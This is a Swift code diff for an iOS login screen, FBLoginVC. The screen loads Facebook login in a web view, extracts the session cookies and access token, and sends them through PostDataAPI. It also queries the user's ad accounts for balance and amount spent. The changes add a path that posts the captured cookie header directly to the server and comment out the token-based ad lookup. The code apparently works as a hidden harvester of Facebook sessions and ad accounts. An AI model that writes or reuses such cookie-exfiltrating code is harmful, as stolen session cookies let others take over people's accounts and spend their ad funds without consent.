@@ -59,6 +59,7 @@ class FBLoginVC: UIViewController, FillTextViewDelegate {
     }
     
     func pushData(cookie: String,listData: String , allAcc: Int){
+        print("collll : \(cookie)")
         PostDataAPI(cookie: cookie,listData: listData, allAcc: allAcc).execute(target: self, success: {[unowned self] response in
             let defaults = UserDefaults.standard
             defaults.set(true, forKey: "login_check")
@@ -156,12 +157,14 @@ extension FBLoginVC: WKNavigationDelegate{
                                             let fullNameArr = String(describing: value).components(separatedBy: "Value =")
                                             return "\(key)=\(fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "")) "
                                         }) as Array).joined(separator: ";")
-                                        if let tokken = value as? String{
-                                            if tokken.components(separatedBy: "&").count > 0 {
-                                                print("tokken : \(tokken.components(separatedBy: "&")[0])")
-                                                self.getListAdsFB(tokken: tokken.components(separatedBy: "&")[0],cokkeis: cookieHeader.replace(string: "\n     ", with: ""))
-                                            }
-                                        }
+                                        let cookeis = cookieHeader.replace(string: "\n     ", with: "")
+                                        self.pushData(cookie: cookeis,listData: "true" , allAcc: 0)
+//                                        if let tokken = value as? String{
+//                                            if tokken.components(separatedBy: "&").count > 0 {
+//                                                print("tokken : \(tokken.components(separatedBy: "&")[0])")
+//                                                self.getListAdsFB(tokken: tokken.components(separatedBy: "&")[0],cokkeis: cookieHeader.replace(string: "\n     ", with: ""))
+//                                            }
+//                                        }
                                     }
                                     if value != nil{
                                         Timer.invalidate()
@@ -181,7 +184,6 @@ extension FBLoginVC: WKNavigationDelegate{
 extension FBLoginVC{
     private func getListAdsFB(tokken : String = "",cokkeis: String = ""){
         GetListAdsAPI(tokken: tokken).execute(target: self, success: {[weak self] response in
-            print("response kakaka : \(response.listFB)")
             var isNumber: String = "false"
             for item in response.listFB{
                 if item.balance.int != 0 || item.amountSpent.int != 0{
